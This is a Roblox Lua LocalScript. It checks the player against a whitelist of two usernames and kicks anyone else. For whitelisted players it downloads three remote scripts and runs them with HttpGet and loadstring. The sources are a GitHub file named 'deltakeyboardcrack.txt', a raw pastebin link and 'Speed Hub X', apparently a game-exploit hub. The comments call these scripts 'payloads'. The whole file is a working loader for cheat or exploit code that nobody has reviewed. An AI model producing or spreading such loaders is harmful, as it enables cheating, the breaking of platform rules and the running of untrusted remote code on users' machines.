-- LocalScript (put in StarterGui)
-- Only authorized players can run the payload. Unauthorized players will be kicked.

local Players = game:GetService("Players")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Authorized usernames (case-insensitive)
local AUTH = {
    ["123_lorenzoluis"] = true,
    ["deepscriptai"]    = true, -- stored lowercase for safe compare
}

local function isAuthorized(name)
    if not name then return false end
    return AUTH[string.lower(name)] == true
end

local function kickUnauthorized()
    local msg = "Unauthorized. Authorized accounts: 123_lorenzoluis, deepscriptAI"
    -- Kick the local player with a helpful message.
    -- NOTE: A LocalScript can only kick the local player; it cannot affect others.
    pcall(function()
        player:Kick(msg)
    end)
end

-- GUI popup for authorized use
local function showAuthorizedPopup()
    -- cleanup existing if present
    local existing = playerGui:FindFirstChild("AuthorizedUseGui")
    if existing then existing:Destroy() end

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "AuthorizedUseGui"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = playerGui
    screenGui.DisplayOrder = 1000

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 300, 0, 120)
    frame.AnchorPoint = Vector2.new(1, 0.5) -- anchor to right
    frame.Position = UDim2.new(1, -12, 0.5, 0)
    frame.BackgroundTransparency = 0.15
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 0
    frame.Parent = screenGui

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, -16, 0, 28)
    title.Position = UDim2.new(0, 8, 0, 8)
    title.BackgroundTransparency = 1
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Text = "Script Authorization"
    title.TextScaled = true
    title.Parent = frame

    local body = Instance.new("TextLabel")
    body.Size = UDim2.new(1, -16, 0, 64)
    body.Position = UDim2.new(0, 8, 0, 36)
    body.BackgroundTransparency = 1
    body.TextXAlignment = Enum.TextXAlignment.Left
    body.TextWrapped = true
    body.Text = ("Authorized user: %s\nOnly you (%s) may use this script.\nAuthorized accounts: 123_lorenzoluis, deepscriptAI")
        :format(player.Name, player.Name)
    body.TextScaled = false
    body.TextSize = 14
    body.Parent = frame

    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 36, 0, 24)
    closeBtn.Position = UDim2.new(1, -44, 0, 8)
    closeBtn.Text = "X"
    closeBtn.TextScaled = true
    closeBtn.Parent = frame

    closeBtn.MouseButton1Click:Connect(function()
        screenGui:Destroy()
    end)

    -- auto-hide after 8 seconds (keeps it polite)
    task.delay(8, function()
        if screenGui and screenGui.Parent then
            screenGui:Destroy()
        end
    end)
end

-- MAIN
if not isAuthorized(player.Name) then
    -- unauthorized -> kick with message
    kickUnauthorized()
    return
end

-- At this point: authorized user
showAuthorizedPopup()

-- === Run payload scripts safely ===
-- Each loadstring is wrapped in pcall so one failing script doesn't break the rest.
local urls = {
    "https://raw.githubusercontent.com/Xxtan31/Ata/main/deltakeyboardcrack.txt",
    "https://pastebin.com/raw/5mYBMjNt",
    "https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua",
}

for _, url in ipairs(urls) do
    local ok, err = pcall(function()
        -- game:HttpGet may error in some environments; pcall protects against that.
        local source = game:HttpGet(url, true)
        if source and #source > 0 then
            local fn, loadErr = loadstring(source)
            if not fn then
                error(("Failed to load code from %s: %s"):format(url, tostring(loadErr)))
            end
            -- run the returned function
            fn()
        else
            error(("Empty response from %s"):format(url))
        end
    end)

    if not ok then
        -- inform via warn (printed to output) but do not kick or crash
        warn(("Error running payload from %s: %s"):format(url, tostring(err)))
    end
end

-- Optional: Print to console that authorized execution happened
print(("Authorized script executed by %s"):format(player.Name))
